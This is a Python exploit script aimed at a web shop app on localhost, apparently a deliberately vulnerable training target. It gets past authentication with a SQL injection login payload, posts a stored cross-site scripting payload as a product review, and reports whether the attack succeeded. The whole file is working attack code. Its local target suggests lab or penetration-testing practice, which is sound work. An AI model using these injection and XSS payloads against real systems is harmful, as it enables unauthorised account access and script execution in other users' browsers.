#!/usr/bin/env python3
"""
Stored XSS - Product Review
Target: /api/Reviews/
Payload: <img src=x onerror=alert('Stored XSS')>
"""
import requests
import sys
import json

BASE_URL = "http://localhost:3000"
REVIEW_ENDPOINT = f"{BASE_URL}/api/Reviews/"

# First, we need to authenticate to post a review
# Try login bypass first
login_payload = {"email": "' OR '1'='1' --", "password": "anything"}
login_resp = requests.post(f"{BASE_URL}/rest/user/login", json=login_payload)

if login_resp.status_code != 200:
    print("[-] Could not authenticate for review posting")
    sys.exit(1)

try:
    token = login_resp.json()["authentication"]["token"]
    print(f"[+] Got auth token: {token[:20]}...")
except:
    print("[-] No token in login response")
    sys.exit(1)

# Stored XSS payload in product review
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
xss_payload = "<img src=x onerror=alert('Stored XSS')>"

review_data = {
    "productId": 1,  # First product
    "message": xss_payload,
    "rating": 5
}

print(f"[*] Target: {REVIEW_ENDPOINT}")
print(f"[*] Payload: {xss_payload}")

response = requests.post(REVIEW_ENDPOINT, headers=headers, json=review_data)
print(f"[*] Status: {response.status_code}")
print(f"[*] Response: {response.text}")

if response.status_code in (200, 201):
    print("[+] SUCCESS: Review posted with XSS payload!")
    print("[+] Stored XSS confirmed - payload executes when product page viewed")
    sys.exit(0)
else:
    print("[-] FAILED: Could not post review")
    sys.exit(1)